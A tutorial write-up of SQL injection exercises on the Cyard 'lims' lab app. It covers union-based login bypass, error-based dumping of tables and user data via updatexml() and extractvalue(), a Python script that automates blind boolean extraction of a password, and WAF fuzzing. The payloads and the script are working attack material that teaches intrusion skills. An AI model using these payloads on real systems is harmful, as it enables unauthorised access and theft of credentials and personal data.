---
title: "SQL Injection - Cyard Challenges"
classes: wide
header:
  teaser: /assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/SQL_Labs_Cover.png
ribbon: red
description: "Hello, in this writeup, I will talk about how to find and exploit SQL Injection in `lims` app provided by [Cyard](https://cyard.0x4148.com/). The Challenge involves `Login` page. The objective is to bypass authentication and dump data from different places the whole app.
"
categories:
  - Tutorials
toc: false
---

<img src="/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/SQL_Labs.png" alt="IDOR" style="zoom:100%;" />

## Table of Contents
  - [Introduction](#introduction)
  - [Authentication Bypass](#authentication-bypass)
    - [Union-Based SQL Injection](#union-based-sql-injection)
    - [Error-Based SQL Injection](#error-based-sql-injection)
  - [Admin Portal](#admin-portal)
    - [Union-Based SQL Injection](#union-based-sql-injection-1)
    - [Error-Based SQL Injection](#error-based-sql-injection-1)
  - [Blind Boolean-Based SQL Injection Challenge](#blind-boolean-based-sql-injection-challenge)
  - [SQL Injection: WAF Evasion](#sql-injection-waf-evasion)

## Introduction

Hello, in this writeup, I will talk about how to find and exploit SQL Injection in `lims` app provided by [Cyard](https://cyard.0x4148.com/). The Challenge involves `Login` page. The objective is to bypass authentication and dump data from different places the whole app.

## Authentication Bypass

First, let's visit the [app](https://livelabs.0x4148.com/lims) and start Login page.

![Login_Page](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Page.png)

As we learned in SQL Injection Tutorial (you can find it [here](https://emp3r0r10.github.io/tutorials/SQL-Injection/)), let's start to inject random credentials and see what happens

![Login_test](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_test.png)

We can see above it just redirect us to the same login page which means that credentials is incorrect.

Let's inject a single quote to see how the query will be broken.

 ![Login_single_quote](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_single_quote.png)

We can see above that the query was broken, but how the query looks like? let's break it down.

In login pages, we can assume that the main objective is to redirect the user to dashboard or admin portal. So, we have 3 scenarios of the query.

The main query looks like:

```sql
select * from users where username='$user' and password='$pass';
```

**Scenario #1:**

A user enters username and password and the server checks if there is a record in database the contains the same username and password and if found the user logged in.

**Scenario #2:**

A user enters username and password and the server compares the password exist in the database for the specified user and the password that entered by user.

**Scenario #3:**

A user enters username and password and the server compares the password `hash`exist in the database for the specified user with the password `hash` that entered by user.

So, if the server doesn't check for the password we can try `scenario #1`.

![Login_Bypass_Scenario_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Bypass_Scenario_1.png)

We can see above, it doesn't returned any result, which means it might verify the password.

So, let's check the second scenario, we can bypass authentication using `Union-Based SQL Injection`.

### Union-Based SQL Injection

If the application checks password returned from user and compare it with the password in the database, the query will be the following:

```sql
select password from users where username='$user' and password='$pass';
-- then compare the password with the one in the database.
/* if (password == $row[password]) {
    header('Location: dashboard.php');
} */
....
```

Can we abuse the above query to be like this:
```sql
select password from users where username='attacker' union select 'Pass'
```

the returned value from the query is `Pass` because the first `select` statement doesn't return any result and the second `select` will return the value of it to be from the database.

The same here, we will enter invalid user and use `union select 'Pass'` to make the password returned from the database is `Pass` and the password we entered is the same to make the server redirect us to the dashboard/portal as the condition is true.`

```sql
select password from users where username='attacker' union select 'Pass' and password='Pass';
```

![Login_Bypass](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Bypass.png)

![Dahboard](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Dahboard.png)

### Error-Based SQL Injection

We saw above that when we inject a single quote, the response contained an error. We can use this error to exfiltrate data from database.

There is some functions rather than return a simple error, they return more information about database in the error.

Some of these functions: `updatexml()`, `extractvalue()`.

We will use `updatexml()` to exfiltrate data.

> This function replaces a single portion of a given fragment of XML markup `xml_target` with a new XML fragment `new_xml`, and then returns the changed XML. The portion of `xml_target` that is replaced matches an XPath expression `xpath_expr` supplied by the user. If no expression matching `xpath_expr` is found, or if multiple matches are found, the function returns the original `xml_target` XML fragment. All three arguments should be strings.
>
> ```
> UpdateXML(xml_document, xpath_expr, replacement)
> ```
>
> `xml_document`: The XML document you want to modify.
>
> `xpath_expr`: The XPath expression used to select the nodes that you want to modify.
>
> `replacement`: The value that will replace the selected node(s).

The query we will use if the following:

`updatexml(null,concat(0x0a,'<Data_To_Exfiltrate>'),null)-- -`

The `CONCAT(0x0a, 'user()')` part concatenates two values:

- `0x0a`: This is the hexadecimal representation of the `line feed character (LF)`, which is a new line character.

- `'user()'`: returns the current MySQL user.

- The result of this concatenation is `\n asfg`.

As the first and third parameters are `null`, it will process the second argument normally.

**Query to read exfiltrate `user()`:** `updatexml(null,concat(0x0a,user()),null)-- -`

![Login_user](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_user.png)

**Query to read exfiltrate `version()`:** `updatexml(null,concat(0x0a,version()),null)-- -`

![Login_version](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_version.png)

**Query to read exfiltrate `tables`:** `updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1 )),null)-- -`

> Note: update `limit 0,1` to `limit 1,1`, etc. to get all tables.



![Login_Table_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Table_1.png)

![Login_Table_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Table_2.png)

**Query to read exfiltrate `columns`:** `updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_name='nominee' limit 0,1 )),null)-- -`

![Login_Columns_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Columns_1.png)

![Login_Columns_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Columns_2.png)

Now, we have columns and tables let's extract usernames and phone numbers, etc from database.

![Login_Extract_Data](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Login_Extract_Data.png)

## Admin Portal

After we bypass login page, we will be redirected to `Admin Portal`, Let's see what is there.

We can see a `client.php` page and there is a `Client Status`, let's click it.

![Portal_Client](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client.png)

We can see there is a `client_id` parameter in the request, let's try to inject a single quote on it.

![Protal_Clien_ID](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Protal_Clien_ID.png)

![Portal_Client_single_quote](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_single_quote.png)

We can see above, the response contains a SQL Error which indicates to SQL Injection.

Let's try to exfiltrate data again but this time using `Union-Based SQL Injection`.

### Union-Based SQL Injection

To exfiltrate data using `union` statement, we need to know number of columns and to do this, we will use `order by` statement.

**Query to read exfiltrate number of columns:** `' order by 100 -- -`. Reduce this number until you get the right number of columns which is `12`.

![Portal_Client_Order_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_Order_1.png)

![Portal_Client_Order_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_Order_2.png)

Now, we can use `union` statement to determine the vulnerable/returned columns.

We can see in the below image there are many columns returned from the database. We will use first 3 columns.

![Portal_Client_union_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_1.png)

![Portal_Client_union_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_2.png)

Retrieve `database()`, `user()`, and `version()`.

![Portal_Client_union_4](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_4.png)

Retrieve tables.

![Portal_Client_union_5](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_5.png)

![Portal_Client_union_6](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_6.png)

![Portal_Client_union_7](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_7.png)

Retrieve Columns.

![Portal_Client_union_8](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_8.png)

![Portal_Client_union_9](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_9.png)

![Portal_Client_union_10](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_10.png)

![Portal_Client_union_11](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_union_11.png)

Exfiltrate data from database.

![Portal_Client_Extract_Data_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_Extract_Data_1.png)

![Portal_Client_Extract_Data_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Portal_Client_Extract_Data_2.png)

### Error-Based SQL Injection

After checking the portal more I found `Error-Based SQL Injection` in the `clientStatus.php` also and `nominee.php`.

This time, we can use `extractvalue()` to exfiltrate data from database.

> The EXTRACTVALUE function **takes as arguments an XMLType instance and an XPath expression and returns a scalar value of the resultant node**. The result must be a single node and be either a text node, attribute, or element.
>
> ```
> EXTRACTVALUE(xml_document, xpath_expr)
> ```
>
> **`xml_document`**: The XML document from which you want to extract the value.
>
> **`xpath_expr`**: The XPath expression used to select the nodes from the XML document.

The query we will use if the following:

`extractvalue('test',concat('.',<Data_To_Exfiltrate>))-- -`

The `concat('.',user())` part concatenates two values:

- `.`: To handle the query as XPATH expression.

- `'user()'`: returns the current MySQL user

You can try it yourself and extract as we explain in `updatexml()` above.

## Blind Boolean based SQL Injection Challenge

The challenge from [Cyard](https://cyard.0x4148.com/).

In `Boolean based sql injection`, we rely on the message returned from the application.

Let's start the challenge.

![Boolean_Challenge](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_Challenge.png)



We can see the challenge contains login and reset password. I have tested login page and can't found something useful to do in it. So, let's move to password reset functionality.

If we enter `admin`, it gives us green message which means the user exist and red message means the user doesn't exist.

![Boolean_true_message](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_true_message.png)

![Boolean_false_message.png](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_false_message.png.png)



Let's intercept the request to burp and play with it.

If we inject a single quote, the response will return `500 Internal server error` which is not usual.

![Boolean_single_quote](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_single_quote.png)



Let's try to fix the query using `'and '1'='1` and the response will be normal again.

![Boolean_fix_query](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_fix_query.png)

If we try `order by` or `union` statement here will not working because there is no error messages returned.

So, we can send queries that returns true (green message) if the query is valid and false (red message) otherwise.

We can use `substring()` function to brute force and extract a part of a string based on specified starting and ending positions. Let's use it to exfiltrate data.

> ```
> SUBSTRING(string, start, length)
> ```
>
> - **`string`**: The input string from which you want to extract a part.
> - **`start`**: The position to start extracting. (1-based index, i.e., the first character is at position 1.)
> - **`length`**: The number of characters to extract.

Let's try to extract user of the database `user()` using `substring(user(),1,1)='a`.

In this query the substring returns the first character of `user()` and compare it with letter `a`, if true, the green message will appear in the response, otherwise the red message will fire.

![Boolean_substring_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_substring_1.png)

![Boolean_substring_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_substring_2.png)

![Boolean_substring_3](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/Boolean_substring_3.png)

We can see the first and second characters of `user()` is `bl`. But doing this manually is tough, so, I create a script to automate the process.

```python
import requests

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}
url = "https://livelabs.0x4148.com/challenges/boolean_1/"
target_text = "A password reset email has been sent."

# Determine the length of the query result
query_length = 0
query = "select password from users limit 1"
for i in range(1, 100):
    payload = f"username=admin' and length(({query}))={i} and 1='1&reset_password="
    response = requests.post(url, headers=headers, data=payload)
    if target_text in response.text:
        query_length = i
        print(f"Query result length: {query_length}")
        break

if query_length == 0:
    print("Failed to determine query result length.")
    exit(1)

# Extract the query result
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?/`~-=\\\"' "
flag = ""
for position in range(1, query_length + 1):
    for char in chars:
        payload = f"username=admin' and substring(({query}),{position},1)='{char}&reset_password="
        response = requests.post(url, headers=headers, data=payload)
        if target_text in response.text:
            flag += char
            print(f"Extracted so far: {flag}")
            break

print(f"Extracted query result: {flag}")
```

## SQL Injection: WAF evasion 

The challenge from [Cyard](https://cyard.0x4148.com/).

The `Error based` challenge has the same UI as `Boolean based` challenge.

![WAF_Challenge](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge.png)

So without wasting time let's intercept the request from password reset again and inject single quote.

We can see below the response contains `403 Forbidden`. which indicates a WAF existence.

![WAF_Challenge_Test](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge_Test.png)

What we can do here?

Good question! we can go to database documentation and check for functions that trigger an error and we can control this error to retrieve data or collect all possible functions and fuzz for them to check if any of them returns controlled error.



![WAF_Challenge_Test_Function](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge_Test_Function.png)

As the application uses `php`, we can assume that the used database is `MySQL`. So, we can go to `MySQL` documentation and collect all function and use them for fuzzing.

> I will use `concat('abc', 'xyz')` and the expected value should be returned in the response is `abcxyz`. 

![WAF_Challenge_Fuzzing_1](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge_Fuzzing_1.png)

We can see there is a couple of functions with status code `200`, but most of them gives this status code because there is an error in using the function not retrieving the expected value from `concat('abc','xyz') ==> abcxyz` expect `BIN_TO_UUID()` as shown below.

![WAF_Challenge_Fuzzing_2](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge_Fuzzing_2.png)

Now, let's try to use it exfiltrate some data like `version()`, `user()`, `database()`.

After trying to exfiltrate data, we can notice that `version()` is worked and others not.

![WAF_Challenge_Bypass](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge_Bypass.png)

![WAF_Challenge_Bypass_Failed](/assets/images/tutorials/Web_Security_Vulnerabilities/SQL_Lab/WAF_Challenge_Bypass_Failed.png)

At this time, I can't find a bypass for this situation, so that's all for today but I will keep it my mind. Thanks for reading.